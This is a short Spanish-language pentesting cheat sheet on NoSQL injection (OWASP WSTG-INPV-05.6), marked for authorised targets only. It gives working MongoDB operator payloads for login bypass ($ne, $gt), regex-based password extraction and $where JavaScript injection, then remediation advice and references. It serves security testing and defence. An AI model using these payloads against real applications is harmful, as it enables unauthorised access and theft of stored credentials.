# NoSQL Injection

- **WSTG:** `WSTG-INPV-05.6`
- Ver índice: [sqli.md](sqli.md). **Solo sobre objetivos autorizados.**

## Qué es

Inyección contra bases de datos NoSQL (MongoDB y similares). En vez de romper una sintaxis SQL, se abusa de cómo la app construye el filtro/consulta a partir de la entrada, a menudo inyectando **operadores** o estructuras (objetos JSON).

## Detección

```
'   "   \   ;   {   }
# provocar errores o cambios de comportamiento con caracteres especiales
```

## Bypass de autenticación (operadores)

```json
// en un login que recibe JSON
{"username": "admin", "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

```
# como parámetros (query string), sintaxis de operador
username[$ne]=x&password[$ne]=x
```

## Extracción (operadores de comparación / regex)

```json
{"username":"admin","password":{"$regex":"^a"}}   // infiere carácter a carácter
```

## Inyección de operador $where / JS (si aplica)

```json
{"$where": "this.password.length > 0"}
```

## Impacto

Bypass de autenticación, extracción de datos y, con `$where`/JS, ejecución de lógica en el servidor de BD.

## Remediación

- Validar tipos estrictamente (que un campo string no acepte objetos).
- Usar consultas/ODM parametrizados; deshabilitar `$where`/ejecución de JS.
- Sanitizar operadores en la entrada.

## Referencias

- OWASP WSTG `WSTG-INPV-05.6` · PortSwigger — NoSQL injection
